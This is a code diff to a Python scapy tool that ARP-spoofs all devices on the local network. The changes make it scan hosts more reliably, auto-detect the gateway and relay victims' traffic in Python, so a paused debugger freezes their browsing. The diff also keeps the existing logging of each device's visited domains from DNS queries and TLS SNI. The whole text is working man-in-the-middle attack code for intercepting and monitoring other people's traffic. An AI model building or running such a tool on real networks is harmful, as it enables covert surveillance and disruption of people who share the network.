@@ -68,17 +68,38 @@ def scan_network(subnet, iface, my_ip, gateway_ip):
     Excludes our own machine and the gateway (the gateway is handled
     separately as the spoof partner).
     """
+    import subprocess, re, ipaddress
+
     print(f"[*] Scanning {subnet} for connected devices...")
+    hosts = {}
+
+    # 1) Fast scapy ARP scan.
     arp_request = ARP(pdst=subnet)
     broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
     answered = srp(broadcast / arp_request, iface=iface,
-                   timeout=3, retry=2, verbose=False)[0]
-    hosts = {}
+                   timeout=5, retry=3, verbose=False)[0]
     for _, reply in answered:
-        ip, mac = reply.psrc, reply.hwsrc
-        if ip in (my_ip, gateway_ip):
-            continue
-        hosts[ip] = mac
+        hosts[reply.psrc] = reply.hwsrc
+
+    # 2) Fallback for macOS WiFi: ping-sweep to populate the system ARP cache,
+    #    then read it. Helps when broadcast ARP scans get dropped.
+    if len(hosts) <= 1:
+        print("[*] ARP scan thin — running a ping sweep (this takes a few seconds)...")
+        net = ipaddress.ip_network(subnet, strict=False)
+        procs = [subprocess.Popen(["ping", "-c", "1", "-W", "200", str(ip)],
+                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                 for ip in net.hosts()]
+        for p in procs:
+            p.wait()
+        out = subprocess.run(["arp", "-a", "-n"], capture_output=True, text=True).stdout
+        for line in out.splitlines():
+            m = re.search(r"\(([\d.]+)\) at ([0-9a-f:]{17})", line, re.I)
+            if m:
+                hosts[m.group(1)] = m.group(2)
+
+    # Exclude ourselves and the gateway.
+    hosts.pop(my_ip, None)
+    hosts.pop(gateway_ip, None)
     return hosts
 
 
@@ -98,17 +119,19 @@ def restore(target_ip, target_mac, real_ip, real_mac, my_mac, iface):
     sendp(pkt, iface=iface, count=4, verbose=False)
 
 
-def enable_ip_forwarding():
-    import platform
+def set_ip_forwarding(enabled):
+    """Toggle the KERNEL's IP forwarding. We turn it OFF so that forwarding is
+    done by our Python loop instead (lets a debugger pause stall the network)."""
+    import platform, os
+    val = "1" if enabled else "0"
     if platform.system() == "Linux":
         with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-            f.write("1")
+            f.write(val)
     elif platform.system() == "Darwin":
-        import os
-        os.system("sysctl -w net.inet.ip.forwarding=1")
+        os.system(f"sysctl -w net.inet.ip.forwarding={val}")
     else:
-        print("Windows: run as admin -> "
-              "'netsh interface ipv4 set interface <name> forwarding=enabled'")
+        print("Windows: toggle forwarding via "
+              "'netsh interface ipv4 set interface <name> forwarding=<enabled|disabled>'")
 
 
 def extract_sni(data):
@@ -181,8 +204,13 @@ def root_domain(host):
     return last2
 
 
-def make_callback(targets):
-    """targets: set of IPs we are monitoring. Output is tagged by source IP."""
+def make_callback(targets, hosts, gateway_ip, gateway_mac, my_mac, my_ip, iface):
+    """Sniff callback that BOTH logs domains AND manually forwards packets.
+
+    Because forwarding happens here in Python (kernel IP forwarding is OFF),
+    pausing your debugger anywhere in this function freezes all traffic for
+    the spoofed devices — their browsers just keep loading until you continue.
+    """
     def show(tag, src, host):
         if not host.startswith("www."):
             return
@@ -190,37 +218,79 @@ def make_callback(targets):
             return
         print(f"[{src}] [{tag}] {host}")
 
+    def forward(pkt):
+        """Relay a packet that was diverted to us toward its real destination."""
+        if not pkt.haslayer(Ether) or not pkt.haslayer(IP):
+            return
+        # Only forward frames addressed to our MAC (i.e. diverted by ARP spoof),
+        # and never our own traffic.
+        if pkt[Ether].dst != my_mac:
+            return
+        ip_src, ip_dst = pkt[IP].src, pkt[IP].dst
+        if ip_src == my_ip or ip_dst == my_ip:
+            return
+
+        # Decide the real next-hop MAC.
+        if ip_dst in hosts:
+            next_mac = hosts[ip_dst]          # reply heading back to a device
+        elif ip_src in targets:
+            next_mac = gateway_mac            # request heading out to the internet
+        else:
+            return
+
+        # Rewrite L2 addressing and re-inject. Keep the IP payload untouched.
+        pkt[Ether].src = my_mac
+        pkt[Ether].dst = next_mac
+        sendp(pkt, iface=iface, verbose=False)
+
     def packet_callback(pkt):
-        if not pkt.haslayer(IP):
-            return
-        src = pkt[IP].src
-        if src not in targets:
-            return
+        # 1) Log domains for traffic originating from a monitored device.
+        if pkt.haslayer(IP) and pkt[IP].src in targets:
+            src = pkt[IP].src
+            if pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[DNS].qd is not None:
+                qd = pkt[DNS].qd
+                for rec in (qd if isinstance(qd, list) else [qd]):
+                    try:
+                        show("DNS", src, rec.qname.decode(errors="ignore").rstrip("."))
+                    except Exception:
+                        pass
+            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
+                sni = extract_sni(bytes(pkt[Raw].load))
+                if sni and not sni.startswith("<"):
+                    show("SNI", src, sni)
 
-        # Plaintext DNS (if the device isn't using encrypted DNS)
-        if pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[DNS].qd is not None:
-            qd = pkt[DNS].qd
-            for rec in (qd if isinstance(qd, list) else [qd]):
-                try:
-                    show("DNS", src, rec.qname.decode(errors="ignore").rstrip("."))
-                except Exception:
-                    pass
+        # 2) Manually forward — THIS is the line that, when paused, hangs browsers.
+        forward(pkt)
 
-        # TLS SNI — works even when DNS is encrypted (most modern phones)
-        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
-            sni = extract_sni(bytes(pkt[Raw].load))
-            if sni and not sni.startswith("<"):
-                show("SNI", src, sni)
     return packet_callback
 
 
+def detect_gateway():
+    """Read the default gateway IP from the system routing table."""
+    import subprocess, re, platform
+    if platform.system() == "Darwin":
+        out = subprocess.run(["route", "-n", "get", "default"],
+                             capture_output=True, text=True).stdout
+        m = re.search(r"gateway:\s*([\d.]+)", out)
+    else:  # Linux
+        out = subprocess.run(["ip", "route"], capture_output=True, text=True).stdout
+        m = re.search(r"default via ([\d.]+)", out)
+    return m.group(1) if m else None
+
+
 def main():
-    gateway_ip = "192.168.1.1"
-    subnet = "192.168.1.0/24"
     iface = conf.iface
     my_mac = get_if_hwaddr(iface)
     my_ip = get_if_addr(iface)
     print(f"[*] Using interface {iface}  (our IP: {my_ip}, MAC: {my_mac})")
+
+    # Auto-detect gateway + subnet from the actual network we're on.
+    gateway_ip = detect_gateway()
+    if not gateway_ip:
+        print("[!] Could not detect the gateway. Set gateway_ip manually.")
+        sys.exit(1)
+    subnet = ".".join(my_ip.split(".")[:3]) + ".0/24"
+    print(f"[*] Detected gateway {gateway_ip}, subnet {subnet}")
 
     gateway_mac = get_mac(gateway_ip)
     print(f"[*] Gateway {gateway_ip} -> {gateway_mac}")
@@ -233,16 +303,18 @@ def main():
     for ip, mac in hosts.items():
         print(f"    [+] {ip:<15} {mac}")
 
-    enable_ip_forwarding()
-    print(f"[*] IP forwarding enabled. Spoofing {len(hosts)} device(s) (Ctrl+C to stop)...")
+    # Turn OFF kernel forwarding — our Python callback does the relaying now.
+    set_ip_forwarding(False)
+    print(f"[*] Kernel forwarding OFF. Python is the relay. Spoofing {len(hosts)} "
+          f"device(s) (Ctrl+C to stop)...")
+    print("[*] TIP: set a breakpoint inside forward() — while paused, every "
+          "spoofed browser will hang on 'loading'.")
 
-    # Sniff all monitored hosts; the set is shared and updated on rescans.
+    # Sniff ALL IP traffic (we must forward everything, not just web/DNS).
     targets = set(hosts.keys())
+    cb = make_callback(targets, hosts, gateway_ip, gateway_mac, my_mac, my_ip, iface)
     threading.Thread(
-        target=lambda: sniff(iface=iface,
-                             filter="tcp or udp port 53",
-                             prn=make_callback(targets),
-                             store=False),
+        target=lambda: sniff(iface=iface, filter="ip", prn=cb, store=False),
         daemon=True,
     ).start()
 
@@ -259,6 +331,7 @@ def main():
         for ip, mac in hosts.items():
             restore(ip, mac, gateway_ip, gateway_mac, my_mac, iface)
             restore(gateway_ip, gateway_mac, ip, mac, my_mac, iface)
+        set_ip_forwarding(False)
         print("[*] Done.")
         sys.exit(0)
 
